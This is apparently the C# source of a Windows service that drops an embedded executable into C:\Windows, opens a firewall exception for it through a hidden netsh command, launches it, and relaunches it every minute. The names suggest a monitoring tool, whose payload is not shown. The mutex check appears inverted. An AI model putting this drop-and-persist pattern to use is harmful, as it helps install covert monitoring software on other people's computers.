using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Timers;
using WindowsService.Properties;
using WindowsService.windowApi;

namespace WindowsService
{
    public partial class Service1 : ServiceBase
    {
        //Timer timer1;  //计时器

        bool flag = true;//定义一个bool变量，标识是否接收数据
        Thread thread;//创建线程对象
        UdpClient udp;
        string moniterPath = @"C:\Windows\WindowsFormsApp1.exe";
        System.Timers.Timer timer = null;

        public Service1()
        {
            InitializeComponent();
            timer = new System.Timers.Timer();
            timer.Elapsed += Timer_Elapsed;
            timer.Interval = 1 * 60*1000;
        }

  

        protected override void OnStart(string[] args)
        {
            if (!File.Exists(moniterPath))
            {
                File.WriteAllBytes(moniterPath, Resources.WindowsFormsApp1);
                //ExecuteCom("netsh firewall set portopening UDP 5125 ENABLE", 1);
                ExecuteCom("netsh firewall set allowedprogram "+moniterPath+" A ENABLE", 1);
            }


            WinAPI_Interop.CreateProcess(moniterPath);
        }

        /// <summary>  
        /// 执行DOS命令，返回DOS命令的输出  //转载请注明来自 http://www.uzhanbao.com
        /// </summary>  
        /// <param name="dosCommand">dos命令</param>  
        /// <param name="milliseconds">等待命令执行的时间（单位：毫秒），  
        /// 如果设定为0，则无限等待</param>  
        /// <returns>返回DOS命令的输出</returns>  
        public string ExecuteCom(string command, int seconds)
        {
            string output = ""; //输出字符串  
            if (command != null && !command.Equals(""))
            {
                Process process = new Process();//创建进程对象  
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = "cmd.exe";//设定需要执行的命令  
                startInfo.Arguments = "/C " + command;//“/C”表示执行完命令后马上退出  
                startInfo.UseShellExecute = false;//不使用系统外壳程序启动  
                startInfo.RedirectStandardInput = false;//不重定向输入  
                startInfo.RedirectStandardOutput = true; //重定向输出  
                startInfo.CreateNoWindow = true;//不创建窗口  
                process.StartInfo = startInfo;
                try
                {
                    if (process.Start())//开始进程  
                    {
                        if (seconds == 0)
                        {
                            process.WaitForExit();//这里无限等待进程结束  
                        }
                        else
                        {
                            process.WaitForExit(seconds); //等待进程结束，等待时间为指定的毫秒  
                        }
                        output = process.StandardOutput.ReadToEnd();//读取进程的输出  
                    }
                }
                catch
                {
                }
                finally
                {
                    if (process != null)
                        process.Close();
                }
            }
            return output;
        }

        public System.Drawing.Image ReturnPhoto(byte[] streamByte)
        {
            System.IO.MemoryStream ms = new System.IO.MemoryStream(streamByte);
            System.Drawing.Image img = System.Drawing.Image.FromStream(ms);
            return img;
        }

        private void Timer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            bool flag = false;
            System.Threading.Mutex mutex = new System.Threading.Mutex(true, "Moniter", out flag);
            if (!flag) {
                if (!File.Exists(moniterPath))
                {
                    File.WriteAllBytes(moniterPath, Resources.WindowsFormsApp1);                    
                    //ExecuteCom("netsh firewall set allowedprogram " + moniterPath + " A ENABLE", 1);
                }
                WinAPI_Interop.CreateProcess(moniterPath);
            }

        }

        protected override void OnStop()
        {
            Console.WriteLine("stop!");
        }
    }
}
